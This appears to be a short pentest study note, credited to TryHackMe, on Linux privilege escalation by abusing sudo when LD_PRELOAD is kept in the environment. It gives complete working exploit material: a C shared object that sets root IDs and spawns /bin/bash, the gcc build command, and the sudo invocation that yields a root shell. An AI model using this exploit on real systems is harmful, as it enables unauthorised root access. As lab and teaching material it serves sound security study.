---
description: SUDO exploitation by LD_PRELOAD
---

# SUDO

View own SUDO permissions

`sudo -l`&#x20;

* LD\_PRELOAD

On some systems, you may see the LD\_PRELOAD environment option.

![https://i.imgur.com/gGstS69.png](https://i.imgur.com/gGstS69.png)

LD\_PRELOAD is a function that allows any program to use shared libraries. If the "env\_keep" option is enabled, we can generate a shared library that will be loaded and executed before running the program. Note that the LD\_PRELOAD option will be ignored if the actual user ID is different from the effective user ID.&#x20;

The steps of this privilege escalation vector can be summarized as follows;&#x20;

1. Check LD\_PRELOAD (with env\_keep option).
2. Write simple C code compiled as a shared object file (.so extension).
3. Run the program with sudo rights and the LD\_PRELOAD option pointing to our '.so' file.

&#x20;The C code will simply spawn a root shell and can be written as follows:

{% code overflow="wrap" %}
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
{% endcode %}

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters:

`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

![shell.c and compilation with gcc](https://i.imgur.com/HxbszMW.png)

We can now use this shared object file when starting any program that our user can run with sudo. In our case we can use Apache2, find, or almost any of the programs that we can run with sudo.

We need to run the program specifying the LD\_PRELOAD option, as follows:

`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`

This will result in a shell spawn with root privileges.

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption><p>Screenshot showing changing to SUDO privileges with exploit</p></figcaption></figure>



_-Credits: TryHackMe_
